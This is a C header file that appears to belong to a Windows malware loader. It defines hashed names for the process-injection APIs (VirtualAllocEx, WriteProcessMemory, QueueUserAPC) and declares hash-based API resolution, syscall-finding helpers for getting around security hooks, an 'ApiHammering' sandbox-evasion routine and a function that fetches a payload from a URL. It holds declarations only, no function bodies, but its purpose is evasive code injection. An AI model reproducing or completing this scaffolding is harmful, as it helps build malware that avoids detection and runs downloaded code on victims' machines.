#pragma once

#include <windows.h>

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

#define NTDLL_HASH 0x0141c4ee
#define KERNEL32_HASH 0xfd2ad9bd
#define CreateProcessA_HASH 0xaa6f2893
#define ReadProcessMemory_HASH 0x5d29a4e7
#define VirtualAllocEx_HASH 0xad56ce7e
#define VirtualAlloc_HASH 0x34115ea6
#define WriteProcessMemory_HASH 0xfd7c9237
#define QueueUserAPC_HASH 0xaab9f2c3
#define VirtualProtect_HASH 0x96ac61c9


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

int FindFirstSyscall(char* pMem, DWORD size);
int FindLastSysCall(char* pMem, DWORD size);

BOOL ApiHammering(DWORD dwStress);
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
